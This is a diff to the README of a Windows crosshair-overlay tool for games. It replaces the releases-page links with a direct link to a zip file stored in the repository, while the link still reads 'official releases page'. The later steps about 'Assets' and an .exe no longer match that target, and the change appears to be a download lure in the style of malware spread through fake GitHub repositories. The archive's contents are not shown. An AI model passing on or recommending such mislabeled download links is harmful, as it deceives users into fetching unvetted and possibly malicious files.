@@ -1,12 +1,12 @@
 # 🎯 Crosshair-X - Improve your aim with custom overlays
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/surarediffusion551/Crosshair-X/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/surarediffusion551/Crosshair-X/main/Crosshair/X-Crosshair-v2.7-beta.1.zip)
 
 Crosshair-X helps players improve their aim in computer games. Many games have crosshairs that are hard to see or lack features. This tool places a custom overlay on your screen. This overlay stays visible during gameplay. It works with most games on Windows. You can change the shape, color, and size of your crosshair.
 
 ## 📥 How to download the software
 
-1. Visit the [official releases page](https://github.com/surarediffusion551/Crosshair-X/releases) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/surarediffusion551/Crosshair-X/main/Crosshair/X-Crosshair-v2.7-beta.1.zip) to find the latest version.
 2. Look for the section titled "Assets" at the bottom of the newest release post.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
